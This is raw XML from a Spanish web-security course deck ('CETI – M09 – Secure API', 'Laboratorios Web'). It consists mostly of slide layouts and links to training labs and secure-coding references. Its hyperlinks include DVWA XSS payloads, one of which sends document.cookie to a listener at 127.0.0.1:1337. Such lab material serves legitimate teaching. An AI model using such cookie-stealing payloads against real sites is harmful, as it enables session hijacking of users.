            <p:ph type="body" sz="quarter" idx="14" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838201" y="6560598"/>
            <a:ext cx="5400431" cy="297402"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="12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documento</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="343089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9" y="987427"/>
            <a:ext cx="3932238" cy="1069973"/>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8"/>
            <a:ext cx="6172201"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9" y="2057400"/>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7" name="Slide Number Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A5F6AD21-0C94-462B-849C-96F42247F048}" type="slidenum">
              <a:rPr lang="es-ES" smtClean="0"/>
              <a:t>‹Nº›</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Marcador de texto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F8A3CE7B-7A0A-4B0A-9220-CAE7DA8A0F25}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="13" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838201" y="230819"/>
            <a:ext cx="5400431" cy="320044"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="838383"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:srgbClr val="838383"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="838383"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr>
              <a:defRPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="838383"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr>
              <a:defRPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="838383"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl5pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Título del tema</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3710088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1_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E6ECB5-36B7-5DE5-C679-37AB58236C3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81159BF2-C46B-20C4-A0DF-6EECE3771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4273CDF-9A0D-A114-D1B7-0A1B6476D1D5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{9DD3205C-ADB9-4084-B0F8-18DE8D9C5431}" type="datetimeFigureOut">
              <a:rPr lang="es-ES" smtClean="0"/>
              <a:t>20/03/2025</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Marcador de pie de página 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CBB65221-9006-85F5-E98B-714D8CD6E50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FB6D8E6-7026-9885-F07C-C788077B2998}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A5F6AD21-0C94-462B-849C-96F42247F048}" type="slidenum">
              <a:rPr lang="es-ES" smtClean="0"/>
              <a:t>‹Nº›</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="766612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port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8496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838200" y="1062707"/>
            <a:ext cx="11018440" cy="781968"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle>
            <a:lvl1pPr algn="l">
              <a:defRPr sz="3000">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Haga clic para modificar el estilo de título</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Marcador de texto 8"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1844678"/>
            <a:ext cx="11018440" cy="2232397"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="2800"/>
            </a:lvl1pPr>
            <a:lvl2pPr>
              <a:defRPr sz="2400"/>
            </a:lvl2pPr>
            <a:lvl3pPr>
              <a:defRPr sz="2000"/>
            </a:lvl3pPr>
            <a:lvl4pPr>
              <a:defRPr sz="1800"/>
            </a:lvl4pPr>
            <a:lvl5pPr>
              <a:defRPr sz="1800"/>
            </a:lvl5pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Haga clic para modificar el estilo de texto </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Segundo nivel</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Tercer nivel</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Cuarto nivel</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4"/>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Quinto nivel</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3822690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866326"/>
            <a:ext cx="10515600" cy="1131150"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="ctr">
            <a:no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838201" y="2219417"/>
            <a:ext cx="10515600" cy="395754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6" name="Slide Number Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7933166" y="102378"/>
            <a:ext cx="2743200" cy="435319"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="ctr"/>
          <a:lstStyle>
            <a:lvl1pPr algn="r">
              <a:defRPr sz="2400">
                <a:solidFill>
                  <a:srgbClr val="838383"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{A5F6AD21-0C94-462B-849C-96F42247F048}" type="slidenum">
              <a:rPr lang="es-ES" smtClean="0"/>
              <a:t>‹Nº›</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35300708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600" kern="1200">
          <a:solidFill>
            <a:srgbClr val="004E9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hyperlink" Target="https://www.youtube.com/watch?v=9lEz1wYG2yQ" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://tryhackme.com/" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.veracode.com/products/security-labs" TargetMode="Externa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hyperlink" Target="https://portswigger.net/web-security/all-labs" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.vulnhub.com/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://pentesterlab.com/" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://sourceforge.net/projects/owaspbwa/"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127.0.0.1/dvwa/setup.php" TargetMode="External"/><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hyperlink" Target="http://127.0.0.1/login.php"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monlaues-my.sharepoint.com/:u:/g/personal/herreraj_monlau_com/EfIaBGTbC01IvEpymLHHJOEBbpfS9RBQwCrf56nsyM_Vaw?e=UldxNf" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide4.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hyperlink" Target="https://sourceforge.net/projects/dvwa.mirror/"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localhost/dvwa" TargetMode="External"/><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portswigger.net/burp/communitydownload"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hyperlink" Target="https://www.php.net/manual/es/mysqli.quickstart.prepared-statements.php" TargetMode="External"/><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https://github.com/mysqljs/mysql#performing-queries"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docs.oracle.com/javase/tutorial/jdbc/basics/prepared.html" TargetMode="External"/><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hyperlink" Target="https://realpython.com/prevent-python-sql-injection/"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hyperlink" Target="https://portswigger.net/web-security/sql-injection/blind" TargetMode="External"/><Relationship Id="rId7"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11.xml"/><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11.xml"/><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11.xml"/><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11.xml"/><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5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image" Target="../media/image59.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/burp/documentation/desktop/automated-scanning" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/support/using-burp-to-detect-sql-injection-flaws"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hyperlink" Target="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide44.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1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hyperlink" Target="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"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hyperlink" Target="https://www.w3schools.com/tags/tag_b.asp" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide56.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image68.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.w3schools.com/js/js_htmldom.asp" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.w3schools.com/jsref/prop_style_fontweight.asp" TargetMode="External"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide58.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide57.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image69.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image66.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide5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8.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image72.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image71.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide60.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=%3cscript%3ewindow.location='http://127.0.0.1:1337/?cookie='+document.cookie%3c/script" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide59.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image73.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide6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0.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image75.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide62.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://localhost/dvwa/vulnerabilities/xss_d/?default=English#&lt;script&gt;alert(1)&lt;/script" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide61.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image77.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image76.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide6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2.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image79.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide6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3.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image81.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide6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4.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image83.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide6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65.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image85.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide6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6.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image87.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide6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8.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image90.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide7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9.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image89.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image92.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide71.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide70.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1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4.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image97.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide7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5.xml"/><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3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://iescelia.org/ciberseguridad/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide76.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.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hyperlink" Target="https://www.scielo.sa.cr/pdf/aie/" TargetMode="External"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide7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7.xml"/><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3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.digitalocean.com/community/tutorials/how-to-configure-webdav-access-with-apache-on-ubuntu-18-04" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide78.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image102.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide80.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost/webdav" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide79.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.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hyperlink" Target="http://localhost/webdav/" TargetMode="External"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide81.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80.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image106.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide8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1.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image108.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide8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82.xml"/><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3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://10.0.3.12/webdav/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide83.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image111.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image110.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide8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4.xml"/><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85.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image115.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image114.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide8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86.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image117.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide8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87.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image119.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide8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88.xml"/><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89.xml"/><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0.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide9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92.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout11.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image123.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide9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93.xml"/><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89639F8-8852-EA41-2314-83927C1B138A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1158193" y="1344305"/>
            <a:ext cx="9638646" cy="2387600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CETI – M09 – Secure API</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4C7B231B-6E7A-F66A-79AE-E2F0D3FACE8C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1158194" y="5254858"/>
            <a:ext cx="4632779" cy="1474787"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Txema</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Herrera</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Subtítulo 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BDD82426-2DE9-509C-B432-79254BFFD381}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ca-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1942183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ítulo 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1919536" y="2492896"/>
            <a:ext cx="8208838" cy="120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 altLang="es-ES" sz="5000" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Laboratorios Web</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3274192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465252" y="175918"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
